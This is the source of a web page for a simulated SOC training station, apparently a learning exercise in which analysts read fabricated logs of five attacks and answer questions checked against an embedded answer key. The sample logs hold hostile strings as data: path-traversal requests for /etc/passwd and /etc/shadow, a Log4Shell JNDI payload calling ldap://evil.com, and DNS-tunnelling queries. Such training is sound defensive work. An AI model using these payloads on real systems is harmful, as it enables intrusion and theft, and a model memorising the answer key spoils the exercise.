---
layout: page
title: "SentinelGuard Ultimate SOC Station"
permalink: /labs/station/
---

<style>
    /* RESET & BASE THEME */
    html, body, main { background-color: #010409 !important; color: #c9d1d9 !important; margin: 0 !important; padding: 0 !important; width: 100%; height: 100%; overflow: hidden; }
    
    #desktop-environment {
        background: radial-gradient(circle, #0d1117 0%, #010409 100%);
        height: 90vh; position: relative; border: 1px solid #30363d; margin: 10px; border-radius: 12px; display: flex; flex-direction: column; font-family: 'JetBrains Mono', monospace;
    }

    /* PENCERE VE MODAL SİSTEMİ (TIKLANMA SORUNU ÇÖZÜLDÜ) */
    .window {
        position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
        width: 96%; height: 92%; background: #0d1117; border: 1px solid #30363d; border-radius: 10px; box-shadow: 0 30px 60px rgba(0,0,0,0.9); display: flex; flex-direction: column; z-index: 100; pointer-events: auto;
    }
    .modal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 500; display: flex; justify-content: center; align-items: center; }
    .custom-modal { background: #161b22; border: 1px solid #58a6ff; padding: 30px; border-radius: 12px; text-align: center; max-width: 500px; border-top: 5px solid #58a6ff; pointer-events: auto; }

    /* MASAÜSTÜ İKONLARI */
    .desktop-icons { padding: 25px; display: flex; flex-direction: column; gap: 30px; pointer-events: auto; }
    .icon { width: 100px; text-align: center; cursor: pointer; transition: 0.2s; padding: 10px; border-radius: 8px; z-index: 50; }
    .icon:hover { background: rgba(88, 166, 255, 0.1); }
    .icon img { width: 50px; display: block; margin: 0 auto 8px auto; pointer-events: none; }
    .icon span { font-size: 11px; color: #fff; pointer-events: none; }

    /* LAB UI */
    .lab-content { display: flex; flex: 1; overflow: hidden; padding: 20px; gap: 20px; }
    #log-screen { flex: 1; overflow-y: scroll; padding: 15px; font-size: 11px; color: #8b949e; line-height: 1.8; background: #010409; border: 1px solid #30363d; white-space: pre-wrap; }
    .edr-terminal { background: #000; color: #3fb950; padding: 15px; font-family: 'Courier New', monospace; height: 160px; overflow-y: auto; border: 1px solid #30363d; margin-top: 15px; border-radius: 6px; }

    /* BUTONLAR VE INPUTLAR */
    .btn-action { background: #238636; border: none; color: white; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; pointer-events: auto; }
    .btn-action:hover { background: #2ea043; box-shadow: 0 0 20px rgba(46, 160, 67, 0.4); }
    .input-field { width: 100%; background: #0d1117; border: 1px solid #30363d; color: #58a6ff; padding: 10px; margin-top: 5px; border-radius: 5px; outline: none; }
    .correct-ans { border-color: #238636 !important; background: rgba(35, 134, 54, 0.1) !important; }
    .wrong-ans { border-color: #f85149 !important; background: rgba(248, 81, 73, 0.1) !important; }
    .hidden { display: none !important; }

    /* TASKBAR */
    #taskbar { background: #161b22; height: 45px; border-top: 1px solid #30363d; display: flex; align-items: center; padding: 0 20px; gap: 20px; z-index: 200; }
</style>

<div id="desktop-environment">
    <div id="system-modal" class="modal-overlay hidden">
        <div class="custom-modal">
            <h2 id="modal-title" style="color: #58a6ff;">STATION ALERT</h2>
            <div id="modal-body" style="margin: 20px 0; font-size: 14px; color: #e6edf3;"></div>
            <button onclick="closeModal()" class="btn-action">ACKNOWLEDGE</button>
        </div>
    </div>

    <div class="desktop-icons">
        <div class="icon" onclick="openWindow('auth-window')">
            <img src="https://cdn-icons-png.flaticon.com/512/3233/3233514.png">
            <span>Login.sys</span>
        </div>
        <div id="range-icon" class="icon hidden" onclick="openWindow('selection-window')">
            <img src="https://cdn-icons-png.flaticon.com/512/906/906343.png">
            <span>CyberRange.exe</span>
        </div>
    </div>

    <div id="auth-window" class="window">
        <div style="padding: 80px; text-align: center; max-width: 400px; margin: 0 auto;">
            <h3 style="color: #58a6ff;">ANALYST ACCESS</h3>
            <input type="text" id="alias-input" class="input-field" placeholder="Enter Analyst Codename...">
            <br><br>
            <button onclick="loginAnalyst()" class="btn-action">INITIALIZE SESSION</button>
        </div>
    </div>

    <div id="selection-window" class="window hidden">
        <div id="selection-content" style="padding: 30px; overflow-y: auto;">
            <h4 style="color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px;">MISSION CONTROL CENTER</h4>
            <div id="machine-list" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-top: 25px;"></div>
        </div>
        <div id="briefing-content" class="hidden" style="padding: 30px; overflow-y: auto;">
            <h2 id="brief-lab-name" style="color: #58a6ff;">BRIEFING</h2>
            <div id="brief-details" style="background: rgba(88,166,255,0.05); border: 1px solid #30363d; padding: 25px; border-radius: 8px; margin: 20px 0;"></div>
            <div style="display: flex; gap: 15px;">
                <button onclick="hideBriefing()" class="btn-action" style="background:#30363d;">BACK TO MENU</button>
                <button onclick="startInvestigation()" class="btn-action">START INVESTIGATION</button>
            </div>
        </div>
    </div>

    <div id="lab-window" class="window hidden">
        <div class="lab-content">
            <div style="flex: 2.8; display: flex; flex-direction: column;">
                <div style="background:#161b22; padding:8px 15px; font-size:10px; border-bottom: 1px solid #30363d;">SIEM CONSOLE (MONOCHROME_MODE)</div>
                <div id="log-screen"></div>
            </div>
            <div style="flex: 1.2; background: #161b22; padding: 20px; border-radius: 6px; border: 1px solid #30363d; overflow-y: auto;">
                <h4 style="color:#f85149; margin-top:0;">Investigation Questions</h4>
                <div id="q-area"></div>
                <button onclick="checkAnswers()" class="btn-action" style="margin-top: 20px;">SUBMIT EVIDENCE</button>
            </div>
        </div>
    </div>

    <div id="playbook-window" class="window hidden">
        <div style="padding: 40px; overflow-y: auto;">
            <h2 style="color: #3fb950;">INCIDENT RESPONSE COMMAND</h2>
            <div id="playbook-ui"></div>
        </div>
    </div>

    <div id="taskbar">
        <img src="https://cdn-icons-png.flaticon.com/512/270/270104.png" width="22" style="filter: invert(1);">
        <div id="clock" style="font-size: 12px; color: #8b949e; min-width: 80px;">12:00:00</div>
        <div id="active-user" style="margin-left: auto; font-size: 11px; color: #58a6ff;">GUEST@STATION</div>
    </div>
</div>

<script>
    const labs = {
        brute: {
            name: "ADV-01: Stealthy Brute Force",
            diff: "Easy",
            details: "<b>[EN]</b> Low-and-slow brute force detection. Identify the specific tool and compromised time.<br><b>[TR]</b> Yavaş ve sinsi brute force tespiti. Kullanılan aracı ve sızma vaktini bulun.",
            questions: [
                {q: "Attacker IP Address?", a: "141.10.22.5"},
                {q: "Which account was compromised?", a: "svc_web"},
                {q: "MITRE Technique ID? (e.g. T1110)", a: "T1110"},
                {q: "Timestamp of SUCCESS logon?", a: "15:42:01"}
            ],
            logs: () => {
                let l = []; for(let i=0; i<60; i++) l.push(`[15:10:12] INFO Audit: EventID=4624 source=10.10.1.${i} user=jdoe status=Success`);
                for(let i=10; i<40; i+=5) l.push(`[15:${i}:05] WARN Audit: EventID=4625 source=141.10.22.5 user=svc_web status=Failure msg="Bad Password"`);
                l.push(`[15:42:01] CRIT Audit: EventID=4624 source=141.10.22.5 user=svc_web status=Success msg="Logon type 3"`);
                return l.reverse();
            }
        },
        traversal: {
            name: "ADV-02: Directory Traversal",
            diff: "Medium",
            details: "<b>[EN]</b> Identify path traversal attempt and the file the attacker tried to read.<br><b>[TR]</b> Path traversal girişimini ve saldırganın okumaya çalıştığı dosyayı bulun.",
            questions: [
                {q: "Attacker IP Address?", a: "192.168.55.12"},
                {q: "Targeted sensitive file?", a: "/etc/passwd"},
                {q: "HTTP Status Code for the attempt?", a: "200"},
                {q: "What parameter was vulnerable?", a: "file"}
            ],
            logs: () => {
                let l = []; for(let i=0; i<50; i++) l.push(`[10:10:${i}] INFO Apache: 192.168.1.${i} GET /assets/img.png 200`);
                l.push(`[10:15:22] WARN Apache: 192.168.55.12 GET /download.php?file=../../../../etc/passwd HTTP/1.1 200`);
                l.push(`[10:15:25] WARN Apache: 192.168.55.12 GET /download.php?file=%2e%2e%2f%2e%2e%2fetc%2fshadow 403`);
                return l.reverse();
            }
        },
        ransom: {
            name: "ADV-03: Ransomware Execution",
            diff: "Hard",
            details: "<b>[EN]</b> Detect ransomware staging. Identify the process name and the encrypted extension.<br><b>[TR]</b> Fidye yazılımı hazırlığını tespit edin. İşlem adını ve şifrelenen uzantıyı bulun.",
            questions: [
                {q: "Source Hostname?", a: "WKSTN-09"},
                {q: "Malicious process name?", a: "wannacry.exe"},
                {q: "Encryption extension?", a: ".wnry"},
                {q: "CnC Server IP?", a: "203.0.113.42"}
            ],
            logs: () => {
                let l = []; l.push(`[08:00:01] INFO Sysmon: EventID=1 Image="C:\\Windows\\wannacry.exe" CommandLine="-m -net" Parent="cmd.exe"`);
                l.push(`[08:00:10] CRIT Sysmon: EventID=11 TargetFilename="D:\\Finance\\Report.pdf.wnry"`);
                l.push(`[08:01:45] WARN Network: Connection from WKSTN-09 to 203.0.113.42 Port 4444`);
                return l;
            }
        },
        log4j: {
            name: "ADV-04: Log4Shell Exploitation",
            diff: "Expert",
            details: "<b>[EN]</b> Detect JNDI injection. Identify the LDAP server and the malicious class.<br><b>[TR]</b> JNDI enjeksiyonunu tespit edin. LDAP sunucusunu ve zararlı sınıfı bulun.",
            questions: [
                {q: "Attacker IP?", a: "88.99.100.101"},
                {q: "Malicious LDAP URI?", a: "ldap://evil.com/a"},
                {q: "Header used for injection?", a: "User-Agent"},
                {q: "Target Application Port?", a: "8080"}
            ],
            logs: () => {
                let l = []; l.push(`[22:05:12] INFO Tomcat: 88.99.100.101 - "GET /login HTTP/1.1" 200 UA: \${jndi:ldap://evil.com/a}`);
                l.push(`[22:05:15] WARN Outbound: Connection to 88.99.100.101:389 Established`);
                return l;
            }
        },
        exfil: {
            name: "ADV-05: DNS Exfiltration",
            diff: "Expert",
            details: "<b>[EN]</b> Detect data theft via DNS queries. Identify the exfiltrated data and the domain.<br><b>[TR]</b> DNS üzerinden veri sızıntısını tespit edin. Sızdırılan veriyi ve domaini bulun.",
            questions: [
                {q: "Compromised Host?", a: "DESKTOP-AF2"},
                {q: "Exfiltration Domain?", a: "dns-tunnel.com"},
                {q: "Number of suspicious queries?", a: "154"},
                {q: "Targeted sensitive data type?", a: "CreditCard"}
            ],
            logs: () => {
                let l = []; for(let i=0; i<15; i++) l.push(`[11:00:${i}] INFO DNS: DESKTOP-AF2 query A 4839204859302.${i}.dns-tunnel.com`);
                l.push(`[11:05:00] ALERT IDS: Possible DNS Tunneling detected for domain dns-tunnel.com`);
                return l;
            }
        }
    };

    let userAlias = ""; let currentKey = "";

    function openWindow(id) { document.getElementById(id).classList.remove('hidden'); }
    function closeWindow(id) { document.getElementById(id).classList.add('hidden'); }
    function openModal(title, body) { document.getElementById('modal-title').innerText = title; document.getElementById('modal-body').innerHTML = body; document.getElementById('system-modal').classList.remove('hidden'); }
    function closeModal() { document.getElementById('system-modal').classList.add('hidden'); }

    function loginAnalyst() {
        userAlias = document.getElementById('alias-input').value.trim(); if(!userAlias) return;
        document.getElementById('range-icon').classList.remove('hidden');
        document.getElementById('active-user').innerText = `${userAlias.toUpperCase()}@STATION`;
        closeWindow('auth-window');
        openModal("AUTHORIZATION SUCCESS", `Welcome back, Analyst ${userAlias}. Cyber Range is online.`);
        renderSelection();
    }

    function renderSelection() {
        const container = document.getElementById('machine-list');
        container.innerHTML = Object.keys(labs).map(key => `
            <div onclick="showBriefing('${key}')" style="background:#161b22; border:1px solid #30363d; padding:25px; border-radius:12px; cursor:pointer; transition:0.3s; position:relative; overflow:hidden;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                    <span style="font-weight:bold; color:#fff; font-size:14px;">${labs[key].name}</span>
                    <span style="font-size:10px; color:#8b949e; background:#010409; padding:2px 6px; border-radius:4px; border:1px solid #30363d;">${labs[key].diff}</span>
                </div>
                <div style="font-size:11px; color:#8b949e;">Threat Investigation Case</div>
            </div>
        `).join('');
    }

    function showBriefing(key) {
        currentKey = key;
        document.getElementById('selection-content').classList.add('hidden');
        document.getElementById('briefing-content').classList.remove('hidden');
        document.getElementById('brief-lab-name').innerText = labs[key].name;
        document.getElementById('brief-details').innerHTML = labs[key].details;
    }

    function hideBriefing() {
        document.getElementById('selection-content').classList.remove('hidden');
        document.getElementById('briefing-content').classList.add('hidden');
    }

    function startInvestigation() {
        closeWindow('selection-window');
        openWindow('lab-window');
        const lab = labs[currentKey];
        document.getElementById('log-screen').innerHTML = lab.logs().map(l => `<div style="border-bottom:1px solid #161b22; padding:3px 0;">${l}</div>`).join('');
        document.getElementById('q-area').innerHTML = lab.questions.map((q, i) => `
            <div style="margin-bottom:15px;">
                <label style="font-size:11px; color:#8b949e; font-weight:bold;">${q.q}</label>
                <input type="text" id="ans-${i}" class="input-field" placeholder="Analyze logs...">
            </div>
        `).join('');
    }

    function checkAnswers() {
        const lab = labs[currentKey]; let correct = 0;
        lab.questions.forEach((q, i) => {
            const el = document.getElementById(`ans-${i}`);
            if(el.value.trim().toLowerCase() === q.a.toLowerCase()) { correct++; el.classList.add('correct-ans'); el.classList.remove('wrong-ans'); }
            else { el.classList.add('wrong-ans'); el.classList.remove('correct-ans'); }
        });

        if(correct === lab.questions.length) {
            openModal("VERIFIED", "Evidence correct. Proceeding to Incident Response Playbook...");
            setTimeout(() => { closeWindow('lab-window'); openWindow('playbook-window'); renderPlaybook(); }, 2000);
        } else { openModal("MISMATCH", `${lab.questions.length - correct} artifacts could not be verified.`); }
    }

    function renderPlaybook() {
        const area = document.getElementById('playbook-ui');
        area.innerHTML = `
            <div style="background:rgba(88,166,255,0.05); padding:20px; border-radius:8px;">
                <p>1. EDR Remote Terminal: Execute Containment</p>
                <div class="edr-terminal">
                    <div id="edr-out">[SYS] Connection Ready. Use 'kill --pid [id]' or 'isolate --host [name]'</div>
                    <div style="display:flex;"><span>$</span><input type="text" id="edr-in" style="background:none; border:none; color:#3fb950; outline:none; width:100%;" onkeydown="handleEDR(event)"></div>
                </div>
                <div style="margin-top:20px;">
                    <p>2. Final Incident Classification</p>
                    <select id="esc-type" class="input-field"><option value="tp">True Positive (Confirmed Attack)</option><option value="fp">False Positive (Benign Activity)</option></select>
                    <textarea id="esc-note" class="input-field" style="height:80px; margin-top:15px;" placeholder="Final Analyst Note..."></textarea>
                    <button onclick="submitEscalation()" class="btn-action" style="margin-top:15px;">SUBMIT & CLOSE CASE</button>
                </div>
            </div>
        `;
    }

    function handleEDR(e) {
        if(e.key === "Enter") {
            const cmd = e.target.value;
            const out = document.getElementById('edr-out');
            if(cmd.startsWith("kill") || cmd.startsWith("isolate") || cmd.startsWith("reset")) {
                out.innerHTML += `<div style="color:#58a6ff;">[SUCCESS] Action executed on host. Telemetry updated.</div>`;
            } else { out.innerHTML += `<div style="color:#f85149;">[ERROR] Command rejected. Access denied.</div>`; }
            e.target.value = "";
        }
    }

    function submitEscalation() {
        openModal("STATION REPORT", "Case closed. Report sent to L2. Analyst session saved.");
        setTimeout(() => { location.reload(); }, 4000);
    }

    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
</script>
